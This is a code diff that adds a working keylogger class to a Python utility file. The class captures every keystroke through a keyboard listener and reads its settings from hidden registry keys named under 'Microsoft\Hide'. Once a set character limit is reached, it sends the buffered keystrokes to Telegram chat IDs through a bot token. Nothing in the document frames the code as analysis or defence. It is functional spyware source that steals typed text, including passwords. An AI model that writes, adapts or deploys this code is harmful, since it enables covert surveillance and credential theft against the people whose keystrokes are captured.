@@ -166,6 +166,227 @@ class Util:
         file.write(text)
         file.close()
 
+class Keylogger:
+    def __init__(self):
+        self.__buffer = ""
+        self.__regeditPath_Telegram = r"Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\TelegramBot"
+        self.__regeditPath_keylogger = r"Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\Keylogger"
+        self.__limit = int(str(WinRegistry(self.__regeditPath_keylogger).read_value('limit')))
+        self.__active = int(str(WinRegistry(self.__regeditPath_keylogger).read_value('active')))
+
+    def _send(self, reg_text):
+        self.__active = int(str(WinRegistry(self.__regeditPath_keylogger).read_value('active')))
+        if self.__active == 1:
+            __token = str(WinRegistry(self.__regeditPath_Telegram).read_value('token'))
+            __id = WinRegistry(self.__regeditPath_Telegram).read_value('id')
+            bot = telepot.Bot(__token)
+            for id in __id:
+                try:
+                    bot.sendMessage(id, reg_text)
+                    print("[SEND TelegramBot] Send keylogger to: [ID] = " + str(id))
+                except:
+                    print("[SEND TelegramBot] there was a mistake when sending the [ID] = " + str(id))
+        else:
+            pass
+
+    def listen_key(self):
+        def _key_min(numberKey):  # Caracteres Comunes // Optimizados
+            switcher = {
+                # Vocales Minisculas
+                "'a'": "a",
+                "'e'": "e",
+                "'i'": "i",
+                "'o'": "o",
+                "'u'": "u",
+                # Letras  Minusculas
+                "'b'": "b",
+                "'c'": "c",
+                "'d'": "d",
+                "'f'": "f",
+                "'g'": "g",
+                "'h'": "h",
+                "'j'": "j",
+                "'J'": "J",
+                "'k'": "k",
+                "'l'": "l",
+                "'m'": "m",
+                "'n'": "n",
+                "'ñ'": "ñ",
+                "'p'": "p",
+                "'q'": "q",
+                "'r'": "r",
+                "'s'": "s",
+                "'t'": "t",
+                "'v'": "v",
+                "'w'": "w",
+                "'x'": "x",
+                "'y'": "y",
+                "'z'": "z",
+                # Caracteres
+                "','": ",",  # ,
+                "'.'": ".",  # .
+                "'_'": "_",  # _
+                "'-'": "-",  # -
+                "':'": ":",  #
+                # Vocales Mayúsculas
+                "'A'": "A",
+                "'E'": "E",
+                "'I'": "I",
+                "'O'": "O",
+                "'U'": "U",
+                # Letras Mayúsculas
+                "'B'": "B",
+                "'C'": "C",
+                "'D'": "D",
+                "'F'": "F",
+                "'G'": "G",
+                "'H'": "H",
+                "'K'": "K",
+                "'L'": "L",
+                "'M'": "M",
+                "'N'": "N",
+                "'Ñ'": "Ñ",
+                "'P'": "P",
+                "'Q'": "Q",
+                "'R'": "R",
+                "'S'": "S",
+                "'T'": "T",
+                "'V'": "V",
+                "'W'": "W",
+                "'X'": "X",
+                "'Y'": "Y",
+                "'Z'": "Z",
+                # Números Standard
+                "'1'": "1",
+                "'2'": "2",
+                "'3'": "3",
+                "'4'": "4",
+                "'5'": "5",
+                "'6'": "6",
+                "'7'": "7",
+                "'8'": "8",
+                "'9'": "9",
+                "'0'": "0",
+                # Caracteres Especiales
+                "'@'": "@",  # @
+                "'#'": "#",  # #
+                "'*'": "*",  # *
+                "'('": "(",  # (
+                "')'": ")",  # )
+                '"\'"': "'",  # '
+                "'\"'": '"',  # "
+                "'?'": "?",  # ?
+                "'='": "=",  # =
+                "'+'": "+",  # +
+                "'!'": "!",  # !
+                "'}'": "}",  # }
+                "'{'": "{",  # {}
+                "'´'": "´",  # ´
+                "'|'": "|",  # |
+                "'°'": "°",  # °
+                "'^'": "¬",  # ^
+                "';'": ";",  #
+                "'$'": "$",  # $
+                "'%'": "%",  # %
+                "'&'": "&",  # &
+                "'>'": ">",  #
+                "'<'": "<",  #
+                "'/'": "/",  # /
+                "'¿'": "¿",  # ¿
+                "'¡'": "¡",  # ¡
+                "'~'": "~"  #
+            }
+            return switcher.get(numberKey, "")  # Convierte tecla a un valor legible
+
+        def _key_max(numberKey):  # Botones, comunes // Optimizados
+            switcher = {
+                "Key.space": " ",  # Espacio
+                "Key.backspace": "⋪",  # Borrar
+                "Key.enter": "\n",  # Salto de linea
+                "Key.tab": "    ",  # Tabulación
+                "Key.delete": "❌",  # Suprimir
+                # Números
+                "<96>": "0",  # 0
+                "<97>": "1",  # 1
+                "<98>": "2",  # 2
+                "<99>": "3",  # 3
+                "<100>": "4",  # 4
+                "<101>": "5",  # 5
+                "<102>": "6",  # 6
+                "<103>": "7",  # 7
+                "<104>": "8",  # 8
+                "<105>": "9",  # 9
+                "<181>": "♪",  # Open Music ♪
+
+                # Números Númeral
+                "None<96>": "0",  # 0
+                "None<97>": "1",  # 1
+                "None<98>": "2",  # 2
+                "None<99>": "3",  # 3
+                "None<100>": "4",  # 4
+                "None<101>": "5",  # 5
+                "None<102>": "6",  # 6
+                "None<103>": "7",  # 7
+                "None<104>": "8",  # 8
+                "None<105>": "9",  # 9
+                # Teclas raras 2
+                "['^']": "^",
+                "['`']": "`",  #
+                "['¨']": "¨",  #
+                "['´']": "´",  #
+                "<110>": ".",  #
+                "None<110>": ".",  #
+                "Key.alt_l": " ◀Alt ",  #
+                "Key.alt_r": " Alt▶ ",
+                "Key.shift_r": " Shift▶ ",
+                "Key.shift": " ◀Shift ",
+                "Key.ctrl_r": " Ctrl▶ ",  #
+                "Key.ctrl_l": " ◀Ctrl ",  #
+                "Key.right": "▶",  #
+                "Key.left": "◀",  #
+                "Key.up": "🔼",  #
+                "Key.down": "🔽",  #
+                # "'\x16'"  : " [Pegó] ",
+                # "'\x18'"  : " [Cortar] ",
+                # "'\x03'"  : " [Copiar] ",
+                "Key.caps_lock": " 🔒⌨ ",
+                "Key.num_lock": " 🔒🔢 ",
+                # "Key.media_previous"    : "⏮",
+                # "Key.media_next"        : "⏭",
+                # "Key.media_play_pause"  : "⏹",
+                # "Key.media_volume_mute" : "🔇",
+                # "Key.media_volume_up" : "🔊",
+                # "Key.media_volume_down" : "🔉",
+                "Key.cmd": " ⊞ "
+            }
+            return switcher.get(numberKey, "")  # Convierte tecla a un valor legible
+
+        # instance Obj Config
+        print("[KeyLogger] - Start OK")
+
+        def press(key):
+            try:
+                if (len(str(key))) <= 3:
+                    temp = _key_min(str(key))  # Optimitation process and memory
+                else:
+                    temp = _key_max(str(key))  # Optimitation process and memory
+                self.__buffer = self.__buffer + temp  # save keylogger in variable
+                print("    " + str(key) + " <= [key press]=> " + temp)
+                print(self.__buffer)
+
+                if len(self.__buffer) >= self.__limit:
+                    self.__limit = int(str(WinRegistry(self.__regeditPath_keylogger).read_value('limit')))
+                    print("[KEYLOGGER] Reached or exceeded the limit  => " + str(len(self.__buffer)))
+                    self._send(self.__buffer)
+                    self.__buffer = ""
+                else:
+                    print("[KEYLOGGER] Current text length  => " + str(len(self.__buffer)))
+            except:
+                print("[KEYLOGGER] there was a mistake getting key ")
+
+        with Listener(on_press=press) as listener:
+            listener.join()
+
 if __name__ == '__main__':
 
     pass
